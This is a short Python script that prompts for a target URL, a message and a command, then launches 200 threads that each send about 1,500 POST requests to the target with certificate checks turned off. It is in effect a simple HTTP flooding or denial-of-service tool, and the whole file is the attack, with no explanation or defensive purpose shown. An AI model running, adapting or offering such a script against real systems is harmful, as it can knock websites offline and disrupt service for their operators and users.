import requests
from threading import Thread
import time

#remove https warning
requests.packages.urllib3.disable_warnings()

def post(target, user_input, command):
    for i in range(0, 1505):
       headers = {
                'content-type': "application/json",
                'Accept': "*/*",
            }
       response = requests.post(target, data={'data' : user_input, 'command' : command},verify=False)
       time.sleep(0.05)
       print (response.content)

#Input target
target = input("Target: ")
user_input = input("Enter your message here: ")
command =  input("Enter your command here: ")
for x in range(0, 200):
  t = Thread(target=post, args=(target, user_input, command)) 
  t.start()  
  